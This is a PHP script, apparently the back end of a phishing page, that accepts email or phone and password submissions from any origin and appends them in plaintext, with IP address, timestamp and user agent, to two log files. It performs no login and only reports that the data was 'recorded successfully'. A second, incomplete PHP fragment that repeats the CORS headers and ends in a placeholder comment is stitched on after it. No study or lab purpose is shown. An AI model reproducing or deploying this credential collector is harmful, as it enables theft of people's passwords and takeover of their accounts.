<?php
// Set headers for CORS and JSON response
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// Get the request method
$method = $_SERVER['REQUEST_METHOD'];

// Define file paths
$logFile = __DIR__ . '/log.txt';
$formDataFile = __DIR__ . '/form_data.txt';

// Only handle POST requests
if ($method === 'POST') {
    // Get the raw POST data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // Get the current timestamp
    $timestamp = date('Y-m-d H:i:s');
    
    // Get the user's IP address
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Get the user agent
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    
    // Create the log entry
    $logEntry = sprintf(
        "[%s] IP: %s | Email: %s | Password: %s | User-Agent: %s\n",
        $timestamp,
        $ip,
        $email,
        $password,
        $userAgent
    );
    
    // Create the form data entry (formatted for better readability)
    $formDataEntry = "=== Form Submission ===\n";
    $formDataEntry .= "Timestamp: $timestamp\n";
    $formDataEntry .= "IP Address: $ip\n";
    $formDataEntry .= "Email/Phone: $email\n";
    $formDataEntry .= "Password: $password\n";
    $formDataEntry .= "User Agent: $userAgent\n";
    $formDataEntry .= "=====================\n\n";
    
    // Append to both log files
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    file_put_contents($formDataFile, $formDataEntry, FILE_APPEND | LOCK_EX);
    
    // Return a success response
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'message' => 'Form data recorded successfully',
        'timestamp' => $timestamp,
        'data' => [
            'email' => $email,
            'ip' => $ip
        ]
    ]);
} else {
    // Handle non-POST requests
    http_response_code(405); // Method Not Allowed
    echo json_encode([
        'success' => false,
        'message' => 'Method not allowed',
        'allowed_methods' => ['POST']
    ]);
}
?>
<?php
// Enable CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header('Content-Type: application/json');

// Handle preflight request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Rest of your existing PHP code...